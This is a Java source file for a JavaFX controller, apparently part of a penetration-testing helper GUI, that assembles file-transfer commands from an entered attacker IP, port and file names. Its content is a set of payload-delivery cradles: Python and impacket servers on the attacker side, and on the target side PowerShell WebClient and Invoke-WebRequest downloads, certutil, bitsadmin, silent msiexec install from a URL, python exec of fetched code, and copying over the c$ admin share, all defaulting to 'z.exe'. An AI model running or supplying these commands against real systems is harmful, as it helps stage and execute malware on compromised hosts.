package controller.commandCreate;

import javafx.fxml.FXML;
import javafx.scene.control.Button;
import javafx.scene.control.TextField;
import javafx.scene.input.MouseEvent;

public class FileUploadController {
    @FXML
    private TextField textField_1;

    @FXML
    private Button button_change;

    @FXML
    private TextField textField_sfile;

    @FXML
    private TextField textField_12;

    @FXML
    private TextField textField_11;

    @FXML
    private TextField textField_10;

    @FXML
    private TextField textField_dfile;

    @FXML
    private TextField textField_14;

    @FXML
    private TextField textField_13;

    @FXML
    private TextField textField_3;

    @FXML
    private TextField textField_2;

    @FXML
    private TextField textField_ip;

    @FXML
    private TextField textField_port;

    @FXML
    private TextField textField_5;

    @FXML
    private TextField textField_4;

    @FXML
    private TextField textField_7;

    @FXML
    private TextField textField_6;

    @FXML
    private TextField textField_9;

    @FXML
    private TextField textField_8;

    @FXML
    void clicked_change(MouseEvent event) {
        textField_1.setText("python -m SimpleHTTPServer " + textField_port.getText());
        textField_2.setText("python3 -m http.server " + textField_port.getText());
        textField_3.setText("python -m pyftpdlib -p " + textField_port.getText());
        textField_4.setText("python3 impacket-smbserver.py files . -port " + textField_port.getText());
        textField_5.setText("powershell.exe -Command \"Invoke-WebRequest -Uri http://" + textField_ip.getText() + ":"
                + textField_port.getText() +"/" + textField_sfile.getText() + " -OutFile " + textField_dfile.getText() +"\"");
        textField_6.setText("powershell.exe -Command \"IEX(New-Object Net.WebClient).DownloadFile('http://"
                + textField_ip.getText() +":" + textField_port.getText() + "/" + textField_sfile.getText() + "', " + textField_dfile.getText()
                + ")\"");
        textField_7.setText("certutil.exe -urlcache -split -f http://" + textField_ip.getText() + ":" + textField_port.getText() + "/"
                + textField_sfile.getText() + " "+ textField_dfile.getText());
        textField_8.setText("copy \\\\" + textField_ip.getText() + "\\files\\" + textField_sfile.getText() + " " + textField_dfile.getText() +"");
        textField_9.setText("wget http://" + textField_ip.getText() + ":" + textField_port.getText() + "/" + textField_sfile.getText() + " -O " + textField_dfile.getText());
        textField_10.setText("curl http://" + textField_ip.getText() + ":" + textField_port.getText() + "/" + textField_sfile.getText() + " -o " + textField_dfile.getText());
        textField_11.setText("bitsadmin /rawreturn /transfer down \"http://" + textField_ip.getText() + ":" + textField_port.getText() + "/" + textField_sfile.getText() + "\" c:\\\\" + textField_dfile.getText());
        textField_12.setText("msiexec /q /i http://" + textField_ip.getText() + ":" + textField_port.getText() + "/" + textField_sfile.getText() + "");
        textField_13.setText("python -c \"import urllib2; exec urllib2.urlopen('http://" + textField_ip.getText() + ":" + textField_port.getText() + "/" + textField_sfile.getText() + "').read();\"");
        textField_14.setText("copy \\" + textField_ip.getText() + "\\c$\\" + textField_sfile.getText() + " C:\\" + textField_dfile.getText());
    }

    public void initialize(){
        textField_ip.setText("127.0.0.1");
        textField_port.setText("8080");
        textField_sfile.setText("z.exe");
        textField_dfile.setText("z.exe");
        textField_1.setText("python -m SimpleHTTPServer 8080");
        textField_2.setText("python3 -m http.server 8080");
        textField_3.setText("python -m pyftpdlib -p 8080");
        textField_4.setText("python3 impacket-smbserver.py files . -port 8080");
        textField_5.setText("powershell.exe -Command \"Invoke-WebRequest -Uri http://127.0.0.1:8080/z.exe -OutFile z.exe\"");
        textField_6.setText("powershell.exe -Command \"IEX(New-Object Net.WebClient).DownloadFile('http://127.0.0.1:8080/z.exe', z.exe)\"");
        textField_7.setText("certutil.exe -urlcache -split -f http://127.0.0.1:8080/z.exe z.exe");
        textField_8.setText("copy \\\\127.0.0.1\\files\\z.exe z.exe");
        textField_9.setText("wget http://127.0.0.1:8080/z.exe -O z.exe");
        textField_10.setText("curl http://127.0.0.1:8080/z.exe -o z.exe");
        textField_11.setText("bitsadmin /rawreturn /transfer down \"http://127.0.0.1:8080/z.exe\" c:\\\\z.exe");
        textField_12.setText("msiexec /q /i http://127.0.0.1:8080/z.exe");
        textField_13.setText("python -c \"import urllib2; exec urllib2.urlopen('http://127.0.0.1:8080/z.exe').read();\"");
        textField_14.setText("copy \\127.0.0.1\\c$\\z.exe C:\\z.exe");
    }
}
